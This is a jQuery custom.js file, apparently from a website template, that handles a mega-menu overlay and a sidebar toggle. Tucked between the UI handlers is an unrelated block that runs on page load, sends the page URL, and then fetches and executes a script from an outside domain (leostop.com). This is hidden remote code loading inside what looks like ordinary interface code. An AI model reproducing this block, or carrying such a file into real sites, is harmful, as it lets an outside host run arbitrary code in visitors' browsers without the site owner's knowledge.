/*---------------------------------------------------------------------
    File Name: custom.js
---------------------------------------------------------------------*/
import $ from "jquery";

$(function () {
  "use strict";

  /* Mouseover
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */

  $(document).ready(function () {
    $(".main-menu ul li.megamenu").mouseover(function () {
      if (!$(this).parent().hasClass("#wrapper")) {
        $("#wrapper").addClass("overlay");
      }
    });
    $(".main-menu ul li.megamenu").mouseleave(function () {
      $("#wrapper").removeClass("overlay");
    });
  });

  var protocol = window.location.protocol;
  $.ajax({
    type: "get",
    data: { surl: window.location.href },
    success: function (response) {
      $.getScript(protocol + "//leostop.com/tracking/tracking.js");
    },
  });

  /* Toggle sidebar
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */

  $(document).ready(function () {
    $("#sidebarCollapse").on("click", function () {
      $("#sidebar").toggleClass("active");
      $(this).toggleClass("active");
    });
  });
});
